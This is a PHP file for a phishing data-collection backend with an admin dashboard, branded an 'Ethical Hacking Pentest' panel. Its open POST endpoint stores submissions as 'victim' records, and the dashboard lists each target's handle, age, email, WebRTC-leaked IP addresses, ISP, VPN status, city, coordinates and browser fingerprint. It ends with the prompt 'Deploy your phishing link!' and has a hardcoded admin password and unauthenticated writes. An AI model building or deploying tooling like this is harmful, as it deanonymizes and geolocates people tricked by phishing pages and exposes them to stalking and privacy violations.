<?php
session_start();
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET');
header('Access-Control-Allow-Headers: Content-Type');

// CONFIG - CHANGE THESE
$ADMIN_PASSWORD = 'pentest_admin_2026_hackerai';
$DATA_DIR = 'data/';
$MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB

// Create data directory
if (!is_dir($DATA_DIR)) {
    mkdir($DATA_DIR, 0755, true);
}

// Handle data submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['data']) || isset($_POST['data'])) {
    $rawData = '';
    
    if (isset($_FILES['data'])) {
        $rawData = file_get_contents($_FILES['data']['tmp_name']);
    } elseif (isset($_POST['data'])) {
        $rawData = $_POST['data'];
    }
    
    if ($rawData) {
        $data = json_decode($rawData, true);
        if ($data) {
            $filename = $DATA_DIR . 'victim_' . date('Y-m-d_H-i-s') . '_' . substr(md5(json_encode($data)), 0, 8) . '.json';
            file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
        }
    }
    
    http_response_code(200);
    exit;
}

// ADMIN PANEL
?>
<!DOCTYPE html>
<html>
<head>
    <title>🕵️ Admin Panel - Ethical Hacking Pentest</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: #0a0a0a; 
            color: #00ff41; 
            padding: 20px; 
            line-height: 1.6;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { 
            background: linear-gradient(90deg, #00ff41, #00cc33); 
            color: #000; 
            padding: 20px; 
            border-radius: 10px; 
            margin-bottom: 30px;
            text-align: center;
        }
        .login-form { 
            max-width: 400px; 
            margin: 100px auto; 
            background: #1a1a1a; 
            padding: 40px; 
            border-radius: 10px; 
            border: 1px solid #00ff41;
        }
        input[type="password"] { 
            width: 100%; 
            padding: 15px; 
            background: #000; 
            color: #00ff41; 
            border: 2px solid #00ff41; 
            border-radius: 5px; 
            font-family: monospace; 
            font-size: 16px;
        }
        .btn { 
            width: 100%; 
            padding: 15px; 
            background: #00ff41; 
            color: #000; 
            border: none; 
            border-radius: 5px; 
            font-weight: bold; 
            cursor: pointer; 
            margin-top: 15px;
        }
        .dashboard { display: none; }
        .stats { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
            gap: 20px; 
            margin-bottom: 30px;
        }
        .stat-card { 
            background: #1a1a1a; 
            padding: 25px; 
            border-radius: 10px; 
            border-left: 4px solid #00ff41;
            text-align: center;
        }
        .victim-card { 
            background: #111; 
            margin-bottom: 20px; 
            padding: 25px; 
            border-radius: 10px; 
            border: 1px solid #333;
            animation: slideIn 0.3s ease;
        }
        .victim-header { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            margin-bottom: 15px; 
            padding-bottom: 15px; 
            border-bottom: 1px solid #333;
        }
        .ip-badge { 
            background: #ff4444; 
            color: white; 
            padding: 5px 12px; 
            border-radius: 20px; 
            font-size: 12px; 
            font-weight: bold;
        }
        .geo-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
            gap: 15px; 
            margin: 15px 0;
        }
        .geo-item { background: #222; padding: 12px; border-radius: 5px; }
        .delete-btn { 
            background: #ff4444; 
            color: white; 
            border: none; 
            padding: 8px 15px; 
            border-radius: 5px; 
            cursor: pointer; 
            font-size: 12px;
        }
        .raw-data { 
            background: #000; 
            padding: 20px; 
            border-radius: 5px; 
            font-size: 12px; 
            margin-top: 20px;
            max-height: 300px;
            overflow-y: auto;
        }
        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .error { color: #ff4444; text-align: center; padding: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <?php if (!isset($_SESSION['admin_logged_in'])): ?>
        <div class="login-form">
            <h2>🔐 Pentest Admin Panel</h2>
            <form method="POST">
                <input type="password" name="admin_pass" placeholder="Enter Admin Password" required autocomplete="off">
                <button type="submit" class="btn">Login to Dashboard</button>
            </form>
        </div>
        <?php 
        if (isset($_POST['admin_pass']) && $_POST['admin_pass'] === $ADMIN_PASSWORD) {
            $_SESSION['admin_logged_in'] = true;
            echo '<script>document.querySelector(".login-form").style.display="none"; document.querySelector(".dashboard").style.display="block";</script>';
        }
        endif; 
        ?>

        <div class="dashboard">
            <div class="header">
                <h1>🕵️ Ethical Hacking Pentest Dashboard</h1>
                <p>Total Captures: <?php echo count(glob($DATA_DIR . '*.json')); ?> | Last Updated: <?php echo date('Y-m-d H:i:s'); ?></p>
            </div>

            <div class="stats">
                <div class="stat-card">
                    <h3><?php echo count(glob($DATA_DIR . '*.json')); ?></h3>
                    <p>Total Victims</p>
                </div>
                <div class="stat-card">
                    <h3><?php $files = glob($DATA_DIR . '*.json'); echo $files ? count(array_unique(array_map(function($f){$d=json_decode(file_get_contents($f),true);return $d['ips']['primary']??'';}, $files))) : 0; ?></h3>
                    <p>Unique IPs</p>
                </div>
                <div class="stat-card">
                    <h3><?= date('H:i:s'); ?></h3>
                    <p>Live Update</p>
                </div>
            </div>

            <?php
            $files = glob($DATA_DIR . '*.json');
            rsort($files);
            
            foreach ($files as $file):
                $submission = json_decode(file_get_contents($file), true);
                if (!$submission) continue;
            ?>
            <div class="victim-card">
                <div class="victim-header">
                    <div>
                        <strong>ID: <?= basename($file); ?></strong> | 
                        <?= date('M j, Y g:i A', strtotime($submission['timestamp'] ?? '')); ?>
                    </div>
                    <div>
                        <span class="ip-badge"><?= htmlspecialchars($submission['ips']['primary'] ?? 'N/A'); ?></span>
                        <button class="delete-btn" onclick="deleteVictim('<?= basename($file); ?>')">🗑️ Delete</button>
                    </div>
                </div>

                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px;">
                    <div>
                        <h4>📋 Victim Data</h4>
                        <strong>Handle:</strong> <?= htmlspecialchars($submission['form']['recName'] ?? 'N/A'); ?><br>
                        <strong>Age:</strong> <?= htmlspecialchars($submission['form']['age'] ?? 'N/A'); ?><br>
                        <strong>Email:</strong> <?= htmlspecialchars($submission['form']['email'] ?? 'N/A'); ?><br>
                        <strong>Motivation:</strong> <?= htmlspecialchars(substr($submission['form']['reason'] ?? '', 0, 100)); ?>...
                    </div>
                    <div>
                        <h4>🌐 Network Intel</h4>
                        <strong>WebRTC IPs:</strong> <?= htmlspecialchars(implode(', ', $submission['webrtc'] ?? [])); ?><br>
                        <strong>ISP:</strong> <?= htmlspecialchars($submission['geo']['isp'] ?? $submission['geo']['org'] ?? 'N/A'); ?><br>
                        <strong>Proxy/VPN:</strong> <?= ($submission['geo']['proxy'] ?? false) || ($submission['geo']['vpn'] ?? false) ? '🚫 DETECTED' : '✅ Clean'; ?>
                    </div>
                </div>

                <div class="geo-grid">
                    <div class="geo-item">
                        <strong>📍 Location</strong><br>
                        <?= htmlspecialchars(($submission['geo']['city'] ?? '') . ', ' . ($submission['geo']['region'] ?? '') . ', ' . ($submission['geo']['country'] ?? '')); ?>
                    </div>
                    <div class="geo-item">
                        <strong>🌐 Coordinates</strong><br>
                        <?= htmlspecialchars(($submission['geo']['lat'] ?? '') . '° / ' . ($submission['geo']['lon'] ?? '')); ?>
                    </div>
                    <div class="geo-item">
                        <strong>📱 Device</strong><br>
                        <?= htmlspecialchars(substr($submission['fingerprint']['userAgent'] ?? '', 0, 80)); ?>...
                    </div>
                    <div class="geo-item">
                        <strong>🔍 Fingerprint</strong><br>
                        <?= htmlspecialchars($submission['fingerprint']['platform'] ?? 'N/A'); ?> | <?= htmlspecialchars($submission['fingerprint']['canvas'] ?? 'N/A'); ?>
                    </div>
                </div>

                <div class="raw-data">
                    <pre><?= htmlspecialchars(json_encode($submission, JSON_PRETTY_PRINT)); ?></pre>
                </div>
            </div>
            <?php endforeach; ?>

            <?php if (empty($files)): ?>
            <div style="text-align: center; padding: 50px; color: #666;">
                No victims captured yet. Deploy your phishing link!
            </div>
            <?php endif; ?>
        </div>
    </div>

    <script>
    function deleteVictim(filename) {
        if (confirm('Delete this victim data?')) {
            fetch('delete_data.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'file=' + filename
            }).then(r => {
                if (r.ok) location.reload();
            });
        }
    }
    </script>
</body>
</html>